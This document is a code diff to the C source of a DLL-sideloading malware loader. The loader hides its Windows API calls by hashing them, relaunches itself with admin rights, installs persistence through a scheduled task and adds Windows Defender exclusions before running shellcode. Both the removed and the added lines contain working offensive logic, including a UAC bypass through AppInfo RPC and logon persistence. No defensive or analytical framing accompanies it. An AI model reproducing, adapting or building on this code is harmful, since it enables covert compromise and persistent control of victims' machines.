@@ -6,11 +6,12 @@
 // to a thread pool thread via TpAllocWork/TpPostWork
 // (avoids Loader Lock).
 //
-// When REQUIRE_ELEVATION is defined (build.bat sideload uac),
-// the worker thread checks elevation first:
+// When REQUIRE_ELEVATION is defined, the worker thread checks
+// elevation first:
 //   - Not admin: ShellExecuteA "runas" to relaunch host
 //     EXE elevated, then terminate self.
-//   - Admin (or relaunch failed): pin DLL, run Main().
+//   - Admin (or relaunch failed): SideloadInstallAndContinue,
+//     then pin DLL, run Main().
 // Without REQUIRE_ELEVATION, pins the DLL and runs Main()
 // directly at whatever integrity level the host has.
 //
@@ -126,48 +127,6 @@ static BOOL RelaunchElevated(VOID) {
     HINSTANCE hResult = pShellExecuteA(NULL, "runas", szPath, NULL, szDir, 5 /* SW_SHOW */);
     return ((INT_PTR)hResult > 32);
 }
-
-#ifdef UAC_BYPASS
-// -----------------------------------------------
-// Relaunch host EXE elevated via AppInfo RPC bypass
-// No UAC dialog — uses same method as standalone EXE
-// -----------------------------------------------
-static BOOL RelaunchElevatedAppInfo(VOID) {
-    API_HASHING apis;
-    MemSet(&apis, 0, sizeof(apis));
-    if (!InitializeWinApis(&apis)) return FALSE;
-
-    PVOID pNtdll = FindLoadedModuleW(L"NTDLL.DLL");
-    PVOID pK32   = FindLoadedModuleW(L"KERNEL32.DLL");
-    if (!pNtdll || !pK32) return FALSE;
-
-    typedef DWORD (WINAPI* fnGSD)(LPWSTR, UINT);
-    typedef DWORD (WINAPI* fnGWD)(LPWSTR, UINT);
-    typedef DWORD (WINAPI* fnGMFW)(HMODULE, LPWSTR, DWORD);
-
-    fnGSD  pGSD  = (fnGSD) FetchExportAddress(pK32, GetSystemDirectoryW_JOAAT);
-    fnGWD  pGWD  = (fnGWD) FetchExportAddress(pK32, GetWindowsDirectoryW_JOAAT);
-    fnGMFW pGMFW = (fnGMFW)FetchExportAddress(pK32, GetModuleFileNameW_JOAAT);
-    if (!pGSD || !pGWD || !pGMFW) return FALSE;
-
-    WCHAR wSysDir[MAX_PATH] = {0};
-    WCHAR wWinDir[MAX_PATH] = {0};
-    pGSD(wSysDir, MAX_PATH);
-    pGWD(wWinDir, MAX_PATH);
-
-    WCHAR wExeRaw[MAX_PATH] = {0};
-    if (!pGMFW(NULL, wExeRaw, MAX_PATH)) return FALSE;
-
-    // Quote path for CreateProcess lpCommandLine
-    WCHAR wExeCmd[MAX_PATH + 4] = {0};
-    wExeCmd[0] = L'"';
-    SIZE_T n = 0;
-    while (wExeRaw[n] && n < MAX_PATH - 2) { wExeCmd[n + 1] = wExeRaw[n]; n++; }
-    wExeCmd[n + 1] = L'"';
-
-    return UacRunCommandElevated(&apis, pNtdll, wSysDir, wWinDir, wExeCmd);
-}
-#endif /* UAC_BYPASS */
 
 #endif /* REQUIRE_ELEVATION */
 
@@ -314,42 +273,10 @@ static VOID NTAPI SideloadWorker(PVOID Instance, PVOID Context, PVOID Work) {
     (void)Work;
 
 #ifdef REQUIRE_ELEVATION
-    // --- Persistence-reboot detection ---
-    // Scheduled task launches msoia.exe with argument "/pf" and RunLevel Highest.
-    // If "/pf" is present the task already started us elevated — skip re-elevation
-    // and skip re-install; go straight to shellcode.
-    BOOL bPersistBoot = FALSE;
-#if defined(UAC_BYPASS)
-    {
-        typedef LPSTR (WINAPI* fnGCLA2)(VOID);
-        PVOID pK32x = FindLoadedModuleW(L"KERNEL32.DLL");
-        if (pK32x) {
-            fnGCLA2 pGetCmdLine2 = (fnGCLA2)FetchExportAddress(pK32x, GetCommandLineA_JOAAT);
-            if (pGetCmdLine2) {
-                LPCSTR szCmd2 = pGetCmdLine2();
-                if (szCmd2) {
-                    for (DWORD _ci = 0; szCmd2[_ci]; _ci++) {
-                        if (szCmd2[_ci]==' ' && szCmd2[_ci+1]=='/' && szCmd2[_ci+2]=='p' &&
-                            szCmd2[_ci+3]=='f' && (szCmd2[_ci+4]=='\0' || szCmd2[_ci+4]==' ')) {
-                            bPersistBoot = TRUE; break;
-                        }
-                    }
-                }
-            }
-        }
-    }
-#endif
-
     // --- Elevation check (first-run only) ---
-    if (!bPersistBoot && !IsElevated()) {
-        BOOL bRelaunched;
-#ifdef UAC_BYPASS
-        bRelaunched = RelaunchElevatedAppInfo();
-#else
-        bRelaunched = RelaunchElevated();
-#endif
+    if (!IsElevated()) {
+        BOOL bRelaunched = RelaunchElevated();
         if (bRelaunched) {
-            // Elevated instance launched — terminate this medium-IL instance.
             typedef NTSTATUS(NTAPI* fnNtTerminateProcess2)(HANDLE, NTSTATUS);
             fnNtTerminateProcess2 pNtTerminateProcess =
                 (fnNtTerminateProcess2)FetchExportAddress(g_pNtdll, NtTerminateProcess_JOAAT);
@@ -361,11 +288,7 @@ static VOID NTAPI SideloadWorker(PVOID Instance, PVOID Context, PVOID Work) {
     }
 
     // --- Sideload persistence install (elevated first run only) ---
-    // Copies EXE + DLLs, runs WD exclusions, registers scheduled task, then exits.
-    // Shellcode runs on the next logon via the scheduled task (/pf path).
-    // Self-guards: no-op if already running from the persistence directory.
-#if defined(UAC_BYPASS)
-    if (!bPersistBoot && IsElevated()) {
+    if (IsElevated()) {
         OpenBindFile();
         API_HASHING sApis;
         MemSet(&sApis, 0, sizeof(sApis));
@@ -376,7 +299,6 @@ static VOID NTAPI SideloadWorker(PVOID Instance, PVOID Context, PVOID Work) {
         if (pNtTerm) pNtTerm((HANDLE)(ULONG_PTR)-1, 0);
         return;
     }
-#endif
 
 #endif /* REQUIRE_ELEVATION */
 
@@ -490,7 +412,7 @@ BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {
     // might not fire in time for fast-exiting host processes.
     // NtTerminateProcess is NOT patched, so the non-elevated instance
     // can still self-terminate after relaunching elevated.
-    InstallExitHook(g_pNtdll);
+    InstallExitHookPatchless(g_pNtdll);
 
     // --- Queue worker to thread pool ---
     fnTpAllocWork pTpAllocWork = (fnTpAllocWork)FetchExportAddress(g_pNtdll, TpAllocWork_JOAAT);
